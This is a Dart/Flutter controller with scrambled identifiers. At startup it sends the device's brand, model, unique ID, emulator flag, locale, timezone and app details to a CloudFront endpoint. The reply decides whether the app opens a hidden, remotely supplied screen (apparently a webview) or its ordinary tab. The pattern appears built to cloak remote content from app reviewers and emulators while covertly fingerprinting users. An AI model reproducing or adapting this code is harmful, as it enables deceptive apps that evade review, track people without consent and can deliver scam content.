import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';


class BuildLogPlaceLogic extends GetxController {

  var jzogcmfse = RxBool(false);
  var jinevprcf = RxBool(true);
  var kpmtuls = RxString("");
  var kdqi = RxBool(false);
  var teupjdxn = RxBool(true);
  final fgsejlqy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mhduel();
  }


  Future<void> mhduel() async {
    kdqi.value = true;
    teupjdxn.value = true;
    jinevprcf.value = false;

    fgsejlqy.post("https://d3nzspy8zkd8c6.cloudfront.net/lfgvxujatmprkisyhnqwo",data: await bgmocd()).then((value) {
      var egkvidqt = value.data["egkvidqt"] as String;
      var owvajlb = value.data["owvajlb"] as bool;
      if (owvajlb) {
        kpmtuls.value = egkvidqt;
        kdnwm();
      } else {
        bplinf();
      }
    }).catchError((e) {
      jinevprcf.value = true;
      teupjdxn.value = true;
      kdqi.value = false;
    });
  }

  Future<Map<String, dynamic>> bgmocd() async {
    final DeviceInfoPlugin ymdathj = DeviceInfoPlugin();
    PackageInfo egiaxd_oevjksy = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jusrafp = Platform.localeName;
    var cfotv = currentTimeZone;

    var eqof = egiaxd_oevjksy.packageName;
    var vkixs = egiaxd_oevjksy.version;
    var jhnk = egiaxd_oevjksy.buildNumber;

    var aoykgln = egiaxd_oevjksy.appName;
    var apjvr = "";
    var wcpf  = "";
    var wzyqbj = "";
    var fcsbdwme = "";
    var jslwrfhp = "";
    var oxnlicd = "";


    var tokjyr = "";
    var eahsb = false;

    if (GetPlatform.isAndroid) {
      tokjyr = "android";
      var nsgteaujz = await ymdathj.androidInfo;

      wzyqbj = nsgteaujz.brand;

      apjvr  = nsgteaujz.model;
      wcpf = nsgteaujz.id;

      eahsb = nsgteaujz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tokjyr = "ios";
      var gptqzowi = await ymdathj.iosInfo;
      wzyqbj = gptqzowi.name;
      apjvr = gptqzowi.model;

      wcpf = gptqzowi.identifierForVendor ?? "";
      eahsb  = gptqzowi.isPhysicalDevice;
    }
    var res = {
      "aoykgln": aoykgln,
      "jhnk": jhnk,
      "fcsbdwme" : fcsbdwme,
      "eqof": eqof,
      "apjvr": apjvr,
      "eahsb": eahsb,
      "cfotv": cfotv,
      "wzyqbj": wzyqbj,
      "wcpf": wcpf,
      "jusrafp": jusrafp,
      "tokjyr": tokjyr,
      "vkixs": vkixs,
      "jslwrfhp" : jslwrfhp,
      "oxnlicd" : oxnlicd,

    };
    return res;
  }

  Future<void> bplinf() async {
    Get.offNamed("/build_tab");
  }

  Future<void> kdnwm() async {
    Get.offNamed("/build_home_array");
  }

}
